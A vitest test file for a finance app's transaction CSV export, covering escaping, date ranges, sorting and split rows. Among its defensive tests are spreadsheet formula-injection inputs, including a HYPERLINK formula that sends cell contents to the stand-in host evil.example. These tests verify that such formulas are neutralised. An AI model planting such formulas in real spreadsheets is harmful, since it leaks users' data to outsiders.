import { describe, expect, it } from "vitest"

import { CSV_BOM } from "../export"
import { buildTransactionsCsv, transactionsCsvFileName } from "../transactions-export"

import type { Account, Transaction, TransactionSplit } from "../../types"

// ─── Helpers ──────────────────────────────────────────────────────────────────

function makeAccount(overrides: Partial<Account> = {}): Account {
  return {
    id: "acc-1",
    userId: "user-1",
    name: "Checking",
    type: "checking",
    currency: "USD",
    balance: 1000,
    openingBalance: 1000,
    icon: null,
    color: null,
    isArchived: false,
    createdAt: new Date(),
    updatedAt: new Date(),
    ...overrides,
  }
}

function makeTx(overrides: Partial<Transaction> = {}): Transaction {
  return {
    id: "txn-1",
    userId: "user-1",
    accountId: "acc-1",
    type: "expense",
    amount: 50.99,
    currency: "USD",
    categoryId: null,
    description: "Coffee",
    rawDescription: null,
    date: new Date("2024-01-15T12:00:00"),
    notes: null,
    tagIds: [],
    transferToAccountId: null,
    linkedTransactionId: null,
    isRecurring: false,
    splits: [],
    attachments: [],
    status: "cleared",
    importHash: null,
    excludeFromReports: false,
    createdAt: new Date(),
    updatedAt: new Date(),
    ...overrides,
  }
}

function makeSplit(overrides: Partial<TransactionSplit> = {}): TransactionSplit {
  return {
    id: "split-1",
    categoryId: "cat-1",
    amount: 10,
    note: null,
    ...overrides,
  }
}

function stripBom(csv: string): string {
  return csv.startsWith(CSV_BOM) ? csv.slice(CSV_BOM.length) : csv
}

const HEADER = "Date,Status,Type,Description,Amount,Currency,Account,Category,Notes"
const FULL_RANGE = { dateFrom: new Date("2024-01-01"), dateTo: new Date("2024-12-31") }

// ─── BOM + header ─────────────────────────────────────────────────────────────

describe("buildTransactionsCsv — structure", () => {
  it("prepends a UTF-8 BOM and a fixed header row", () => {
    const csv = buildTransactionsCsv({
      transactions: [],
      accounts: [],
      ...FULL_RANGE,
    })
    expect(csv.startsWith(CSV_BOM)).toBe(true)
    expect(stripBom(csv)).toBe(HEADER)
  })

  it("emits one row per transaction with the expected column order", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx()],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    const lines = stripBom(csv).split("\n")
    expect(lines).toHaveLength(2)
    expect(lines[1]).toBe("2024-01-15,cleared,expense,Coffee,50.99,USD,Checking,,")
  })

  it("throws when dateFrom is after dateTo", () => {
    expect(() =>
      buildTransactionsCsv({
        transactions: [],
        accounts: [],
        dateFrom: new Date("2024-07-01"),
        dateTo: new Date("2024-06-01"),
      }),
    ).toThrow(/dateFrom must be <= dateTo/)
  })
})

// ─── Field formatting ─────────────────────────────────────────────────────────

describe("buildTransactionsCsv — field formatting", () => {
  it("formats amount with exactly 2 decimals", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ amount: 7 })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain(",7.00,")
  })

  it("escapes commas in description with double-quotes", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ description: "Coffee, Tea" })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain('"Coffee, Tea"')
  })

  it("escapes embedded double-quotes by doubling them", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ description: 'He said "hello"' })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain('"He said ""hello"""')
  })

  it("wraps values containing newlines in double-quotes", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ notes: "line1\nline2" })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain('"line1\nline2"')
  })

  it.each([
    ['=HYPERLINK("https://evil.example/?d="&A1,"Refund")', `"'=HYPERLINK(""https://evil.example/?d=""&A1,""Refund"")"`],
    ["+cmd", "'+cmd"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1)", "'@SUM(A1)"],
  ])("neutralises a formula in the description: %s", (description, cell) => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ description })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(stripBom(csv).split("\n")[1]).toBe(`2024-01-15,cleared,expense,${cell},50.99,USD,Checking,,`)
  })

  it("neutralises formulas in notes and keeps a negative amount a number", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ amount: -22, notes: "@SUM(A1)" })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(stripBom(csv).split("\n")[1]).toBe("2024-01-15,cleared,expense,Coffee,-22.00,USD,Checking,,'@SUM(A1)")
  })

  it("quotes a semicolon so Italian Excel keeps a payload in one cell", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ notes: "ref;=1+1" })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(stripBom(csv).split("\n")[1]).toBe('2024-01-15,cleared,expense,Coffee,50.99,USD,Checking,,"ref;=1+1"')
  })

  it("quotes a carriage return", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ notes: "a\rb" })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain('"a\rb"')
  })

  it("falls back to accountId when the account is not in the list", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ accountId: "unknown-id" })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain("unknown-id")
  })

  it("uses the account name when the account is found", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx()],
      accounts: [makeAccount({ name: "My Savings" })],
      ...FULL_RANGE,
    })
    expect(csv).toContain("My Savings")
  })

  it("includes categoryId in the category column when present and no splits", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ categoryId: "cat-123" })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain("cat-123")
  })

  it("leaves the category column empty when categoryId is null", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ categoryId: null })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toMatch(/,,\s*$/)
  })

  it("preserves per-row currency (no conversion across rows)", () => {
    const txUsd = makeTx({ id: "u", currency: "USD", amount: 10 })
    const txEur = makeTx({
      id: "e",
      currency: "EUR",
      amount: 20,
      date: new Date("2024-01-16T12:00:00"),
      description: "B",
    })
    const csv = buildTransactionsCsv({
      transactions: [txUsd, txEur],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    const lines = stripBom(csv).split("\n")
    expect(lines[1]).toContain(",USD,")
    expect(lines[2]).toContain(",EUR,")
  })

  it("emits the status column verbatim (cleared / pending / reconciled)", () => {
    const csv = buildTransactionsCsv({
      transactions: [
        makeTx({ id: "a", status: "pending", description: "A" }),
        makeTx({ id: "b", status: "reconciled", description: "B" }),
      ],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain(",pending,expense,A,")
    expect(csv).toContain(",reconciled,expense,B,")
  })
})

// ─── Range filtering and sort ─────────────────────────────────────────────────

describe("buildTransactionsCsv — range and sort", () => {
  it("includes transactions on both range boundaries (inclusive)", () => {
    const csv = buildTransactionsCsv({
      transactions: [
        makeTx({ id: "a", date: new Date("2024-06-01T00:30:00"), description: "Start" }),
        makeTx({ id: "b", date: new Date("2024-06-30T22:00:00"), description: "End" }),
        makeTx({ id: "c", date: new Date("2024-05-31T22:00:00"), description: "Before" }),
        makeTx({ id: "d", date: new Date("2024-07-01T01:00:00"), description: "After" }),
      ],
      accounts: [makeAccount()],
      dateFrom: new Date("2024-06-01"),
      dateTo: new Date("2024-06-30"),
    })
    const lines = stripBom(csv).split("\n")
    expect(lines).toHaveLength(3) // header + 2 rows
    expect(csv).toContain("Start")
    expect(csv).toContain("End")
    expect(csv).not.toContain("Before")
    expect(csv).not.toContain("After")
  })

  it("sorts rows by date asc then description asc", () => {
    const csv = buildTransactionsCsv({
      transactions: [
        makeTx({ id: "a", date: new Date("2024-06-15T12:00:00"), description: "Zebra" }),
        makeTx({ id: "b", date: new Date("2024-06-10T12:00:00"), description: "Banana" }),
        makeTx({ id: "c", date: new Date("2024-06-15T12:00:00"), description: "Apple" }),
      ],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    const lines = stripBom(csv).split("\n").slice(1)
    expect(lines[0]).toContain("Banana")
    expect(lines[1]).toContain("Apple")
    expect(lines[2]).toContain("Zebra")
  })

  it("includes transfer rows as-is (both legs)", () => {
    const csv = buildTransactionsCsv({
      transactions: [
        makeTx({ id: "out", type: "transfer", transferToAccountId: "acc-2", description: "Move" }),
        makeTx({
          id: "in",
          type: "transfer",
          accountId: "acc-2",
          linkedTransactionId: "out",
          description: "Move",
        }),
      ],
      accounts: [makeAccount(), makeAccount({ id: "acc-2", name: "Savings" })],
      ...FULL_RANGE,
    })
    const lines = stripBom(csv).split("\n").slice(1)
    expect(lines).toHaveLength(2)
  })

  it("includes excludeFromReports transactions", () => {
    const csv = buildTransactionsCsv({
      transactions: [makeTx({ description: "Hidden", excludeFromReports: true })],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    expect(csv).toContain("Hidden")
  })
})

// ─── Splits ───────────────────────────────────────────────────────────────────

describe("buildTransactionsCsv — splits", () => {
  it("flattens splits to a single row when expandSplits is false (default)", () => {
    const csv = buildTransactionsCsv({
      transactions: [
        makeTx({
          amount: 100,
          categoryId: null,
          splits: [
            makeSplit({ id: "s1", categoryId: "cat-a", amount: 70 }),
            makeSplit({ id: "s2", categoryId: "cat-b", amount: 30 }),
          ],
        }),
      ],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    const lines = stripBom(csv).split("\n").slice(1)
    expect(lines).toHaveLength(1)
    expect(lines[0]).toContain(",100.00,")
    expect(lines[0]).not.toContain("cat-a")
  })

  it("expands splits into separate rows when expandSplits is true", () => {
    const csv = buildTransactionsCsv({
      transactions: [
        makeTx({
          amount: 100,
          categoryId: null,
          splits: [
            makeSplit({ id: "s1", categoryId: "cat-a", amount: 70 }),
            makeSplit({ id: "s2", categoryId: "cat-b", amount: 30 }),
          ],
        }),
      ],
      accounts: [makeAccount()],
      expandSplits: true,
      ...FULL_RANGE,
    })
    const lines = stripBom(csv).split("\n").slice(1)
    expect(lines).toHaveLength(2)
    expect(lines[0]).toContain(",70.00,")
    expect(lines[0]).toContain("cat-a")
    expect(lines[1]).toContain(",30.00,")
    expect(lines[1]).toContain("cat-b")
  })

  it("appends the split note to the description when present", () => {
    const csv = buildTransactionsCsv({
      transactions: [
        makeTx({
          description: "Groceries",
          splits: [
            makeSplit({ id: "s1", categoryId: "cat-a", amount: 50, note: "produce" }),
            makeSplit({ id: "s2", categoryId: "cat-b", amount: 50, note: null }),
          ],
        }),
      ],
      accounts: [makeAccount()],
      expandSplits: true,
      ...FULL_RANGE,
    })
    expect(csv).toContain("Groceries — produce")
    // Second split has no note → bare parent description
    const lines = stripBom(csv).split("\n").slice(1)
    expect(lines[1]).toContain(",Groceries,")
  })

  it("emits a single row for parent transactions with empty splits regardless of expandSplits", () => {
    const tx = makeTx({ splits: [] })
    const collapsed = buildTransactionsCsv({
      transactions: [tx],
      accounts: [makeAccount()],
      ...FULL_RANGE,
    })
    const expanded = buildTransactionsCsv({
      transactions: [tx],
      accounts: [makeAccount()],
      expandSplits: true,
      ...FULL_RANGE,
    })
    expect(collapsed).toBe(expanded)
  })
})

// ─── Filename ─────────────────────────────────────────────────────────────────

describe("transactionsCsvFileName", () => {
  it("uses ISO range and marks the expanded variant", () => {
    const from = new Date("2024-06-01T12:00:00")
    const to = new Date("2024-06-30T12:00:00")
    expect(transactionsCsvFileName(from, to, false)).toBe(
      "transactions-2024-06-01_to_2024-06-30.csv",
    )
    expect(transactionsCsvFileName(from, to, true)).toBe(
      "transactions-2024-06-01_to_2024-06-30-expanded.csv",
    )
  })
})
